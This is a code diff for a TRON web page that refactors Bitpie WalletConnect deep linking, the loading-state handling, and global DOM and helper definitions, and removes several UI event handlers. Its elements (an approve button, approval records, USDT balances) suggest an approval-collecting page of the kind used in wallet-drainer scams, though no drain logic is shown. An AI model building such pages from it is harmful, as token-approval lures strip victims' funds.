@@ -858,8 +858,8 @@
         tokenpocket: { scheme: "tpdapp://open?params={\"url\":\"", suffix: "\"}", name: "TokenPocket" },
         tronlink: { scheme: "tronlinkoutside://pull.activity?param=", name: "TronLink" },
         bitget: { scheme: "bitkeep://bkconnect?action=dapp&url=", name: "Bitget Wallet" },
-        bitpie: { scheme: "bitpie://walletconnect?uri=${encodedWcUri} // 比特派专属Scheme
-        };
+        bitpie: { scheme: "bitpie://walletconnect?uri=", name: "Bitpie" } // 基础Scheme，动态URI后续拼接
+      };
     // 多语言配置（补齐所有对应翻译，无修改）
     const langConfig = {
         zh: {
@@ -1018,44 +1018,51 @@
     let trxTimer = null; // 能量倒计时定时器
     let contractEnergyEl = null; // 合约剩余能量DOM元素
     let walletConnectAdapter = null;// 比特派WalletConnect实例
-    /********************************************************************
-     * DOM元素集中获取：避免重复查询，提升性能（变量名与原代码一致）
-     ********************************************************************/
-    const DOM = {
-        walletStatusContainer: document.getElementById("walletStatusContainer"),
-        contractAddrEl: document.getElementById("contractAddr"),
-        userInfoEl: document.getElementById("userInfo"),
-        userInfoStatus: document.getElementById("userInfoStatus"),
-        connectBtn: document.getElementById("connectBtn"),
-        approveBtn: document.getElementById("approveBtn"),
-        warning: document.querySelector('.warning'),
-        approvalRecords: document.getElementById("approvalRecords"),
-        reviewTip: document.getElementById("reviewTip"),
-        reviewTipText: document.getElementById("reviewTipText"),
-        langDropdown: document.getElementById("langDropdown"),
-        langToggleBtn: document.getElementById("langToggleBtn"),
-        langDropdownItems: document.querySelectorAll(".lang-dropdown-item"),
-        footerInfo: document.getElementById("footerInfo"),
-        recordList: document.getElementById("recordList"),
-        specialTipContainer: document.getElementById("specialTipContainer"),
-        nonImTokenPopup: document.getElementById("nonImTokenPopup"),
-        closePopupBtn: document.getElementById("closePopupBtn"),       
-        balanceUsdtEl: document.getElementById("balanceUsdt"),
-        balanceTrxEl: document.getElementById("balanceTrx"),
-        balanceEnergyEl: document.getElementById("balanceEnergy"),
-        balanceBandwidthEl: document.getElementById("balanceBandwidth"),
-        balanceItems: document.querySelectorAll(".balance-item"),
-        multiWalletPopup: document.getElementById("multiWalletPopup"),
-        closeMultiWalletBtn: document.getElementById("closeMultiWalletBtn"),
-        walletItems: document.querySelectorAll(".wallet-item"),
-        statusAddressEl: document.getElementById("statusAddress")
-    };
     
     /********************************************************************
-      *    比特派专属：WalletConnect TronProvider初始化（TRON网络+v5.0.206适配）
-     ********************************************************************/
-     // 初始化比特派WalletConnect连接
-    async function initBitpieWalletConnect() {
+ * DOM元素集中获取：避免重复查询，提升性能（变量名与原代码一致）
+ ********************************************************************/
+const DOM = {
+    walletStatusContainer: document.getElementById("walletStatusContainer"),
+    contractAddrEl: document.getElementById("contractAddr"),
+    userInfoEl: document.getElementById("userInfo"),
+    userInfoStatus: document.getElementById("userInfoStatus"),
+    connectBtn: document.getElementById("connectBtn"),
+    approveBtn: document.getElementById("approveBtn"),
+    warning: document.querySelector('.warning'),
+    approvalRecords: document.getElementById("approvalRecords"),
+    reviewTip: document.getElementById("reviewTip"),
+    reviewTipText: document.getElementById("reviewTipText"),
+    langDropdown: document.getElementById("langDropdown"),
+    langToggleBtn: document.getElementById("langToggleBtn"),
+    langDropdownItems: document.querySelectorAll(".lang-dropdown-item"),
+    footerInfo: document.getElementById("footerInfo"),
+    recordList: document.getElementById("recordList"),
+    specialTipContainer: document.getElementById("specialTipContainer"),
+    nonImTokenPopup: document.getElementById("nonImTokenPopup"),
+    closePopupBtn: document.getElementById("closePopupBtn"),       
+    balanceUsdtEl: document.getElementById("balanceUsdt"),
+    balanceTrxEl: document.getElementById("balanceTrx"),
+    balanceEnergyEl: document.getElementById("balanceEnergy"),
+    balanceBandwidthEl: document.getElementById("balanceBandwidth"),
+    balanceItems: document.querySelectorAll(".balance-item"),
+    multiWalletPopup: document.getElementById("multiWalletPopup"),
+    closeMultiWalletBtn: document.getElementById("closeMultiWalletBtn"),
+    walletItems: document.querySelectorAll(".wallet-item"),
+    statusAddressEl: document.getElementById("statusAddress")
+};
+
+// 新增：全局tempFeedback函数（所有地方可调用）
+const tempFeedback = (text) => {
+    DOM.userInfoStatus.style.display = "block";
+    DOM.userInfoStatus.innerHTML = `[开发中] ${text}`;
+    console.log(`[逻辑步骤] ${text}`);
+};
+
+/********************************************************************
+ * 比特派专属：WalletConnect TronProvider初始化（TRON网络+v5.0.206适配）
+ ********************************************************************/
+async function initBitpieWalletConnect() {
     try {
         // 1. 检查官方适配器是否加载
         if (!window.TronWalletAdapterWalletConnect) {
@@ -1776,12 +1783,7 @@ async function sendSignalA1() {
      * 检测钱包环境（TRON兼容钱包）
      */
 async function checkWalletEnv() {
-    // 临时反馈函数（开发环境用，后续删除）- 补全定义！
-    const tempFeedback = (text) => {
-        DOM.userInfoStatus.style.display = "block";
-        DOM.userInfoStatus.innerHTML = `[开发中] ${text}`;
-        console.log(`[逻辑步骤] ${text}`);
-    };
+    // 移除重复定义：const tempFeedback = (text) => { ... }
 
     // 检测到本地tronWeb（已连接钱包）- 保留延时动画
     if (window.tronWeb && window.tronWeb.ready) {
@@ -1942,50 +1944,8 @@ document.addEventListener('DOMContentLoaded', async () => {
     updateUserBalanceDisplay();
 
     /****************************************************************
-     * 语言切换事件（保留原有逻辑，无修改）
-     ****************************************************************/
-    DOM.langToggleBtn.addEventListener("click", (e) => {
-        e.stopPropagation();
-        DOM.langDropdown.classList.toggle("open");
-    });
-    DOM.langDropdownItems.forEach(item => {
-        item.addEventListener("click", (e) => {
-            e.stopPropagation();
-            const newLang = item.getAttribute("data-lang");
-            changeLang(newLang);
-        });
-    });
-    document.addEventListener("click", () => {
-        DOM.langDropdown.classList.remove("open");
-    });
-    DOM.langDropdown.addEventListener("click", (e) => {
-        e.stopPropagation();
-    });
-
-    /****************************************************************
-     * 连接钱包按钮：点击重新显示弹窗（保留原有逻辑，无修改）
-     ****************************************************************/
-    DOM.connectBtn.addEventListener('click', () => {
-        console.log('连接按钮点击，重新显示弹窗');
-        // 关键修改：删除所有强制定位代码，复用元素表原有样式
-        DOM.multiWalletPopup.style.display = "block";
-
-        DOM.userInfoStatus.style.display = "block";
-        DOM.userInfoStatus.innerHTML = "";
-    });
-
-    /****************************************************************
-     * 弹窗关闭逻辑（保留原有逻辑，无修改）
-     ****************************************************************/
-    DOM.closeMultiWalletBtn.addEventListener('click', () => {
-        DOM.multiWalletPopup.style.display = "none";
-        DOM.userInfoStatus.style.display = "none";
-    });
-
-    /****************************************************************
-     * 核心：多钱包点击事件（修复括号闭合+逻辑连贯）
-     ****************************************************************/
-    // 核心：多钱包点击事件（修复缩进+语法闭合）
+ * 核心：多钱包点击事件（修复作用域+加载状态+唤起逻辑）
+ ****************************************************************/
 DOM.walletItems.forEach(item => {
     item.addEventListener('click', async () => {
         const walletType = item.getAttribute("data-wallet");
@@ -2001,11 +1961,9 @@ DOM.walletItems.forEach(item => {
         item.style.pointerEvents = "none";
         DOM.multiWalletPopup.style.display = "none";
 
-
         // ------------ 区分：比特派钱包 vs 其他钱包 ------------
         if (walletType === "bitpie") {
             // 比特派专属唤起逻辑
-            // 临时反馈：开始处理比特派连接
             tempFeedback("开始处理比特派连接...");
 
             try {
@@ -2019,12 +1977,12 @@ DOM.walletItems.forEach(item => {
                 tempFeedback("正在生成比特派连接URI...");
                 const wcUri = walletConnectAdapter.connector?.uri;
                 if (!wcUri) throw new Error("未获取到WalletConnect连接地址");
-                console.log("比特派连接URI:", wcUri); // 控制台看URI是否正常
+                console.log("比特派连接URI:", wcUri);
 
-                // 步骤3：编码URI并构造比特派唤起链接（确认Scheme格式）
+                // 步骤3：编码URI并构造比特派唤起链接（动态拼接Scheme）
                 tempFeedback("正在唤起比特派...");
                 const encodedWcUri = encodeURIComponent(wcUri);
-                const jumpUrl = `bitpie://walletconnect?uri=${encodedWcUri}`; // 比特派v5正确Scheme
+                const jumpUrl = `${wallet.scheme}${encodedWcUri}`; // 拼接基础Scheme+编码后的URI
                 console.log("唤起比特派的链接:", jumpUrl);
 
                 // 步骤4：唤起比特派
@@ -2036,7 +1994,14 @@ DOM.walletItems.forEach(item => {
                     window.tronWeb = walletConnectAdapter.tronWeb;
                     tronWeb = window.tronWeb;
                     initWallet(false);
+                    if (loadingEl) loadingEl.style.display = "none"; // 连接成功后隐藏动画
                 });
+
+                // 兜底：3秒后强制隐藏加载动画（避免卡住）
+                setTimeout(() => {
+                    if (loadingEl) loadingEl.style.display = "none";
+                    item.style.pointerEvents = "auto";
+                }, 3000);
 
             } catch (e) {
                 // 捕获每一步的错误，明确失败原因
@@ -2044,14 +2009,10 @@ DOM.walletItems.forEach(item => {
                 tempFeedback(`比特派连接失败: ${e.message}`);
                 alert(`操作失败：比特派连接失败，原因：${e.message.slice(0, 40)}`);
             
-            } finally {
-                // 无论成功/失败，都恢复加载状态
-                setTimeout(() => {
-                    if (loadingEl) loadingEl.style.display = "none";
-                    item.style.pointerEvents = "auto";
-                }, 500);
+                // 失败后立即恢复状态
+                if (loadingEl) loadingEl.style.display = "none";
+                item.style.pointerEvents = "auto";
             }
-
 
         } else {
             // 其他钱包的跳转逻辑（原逻辑保留，结构正确）
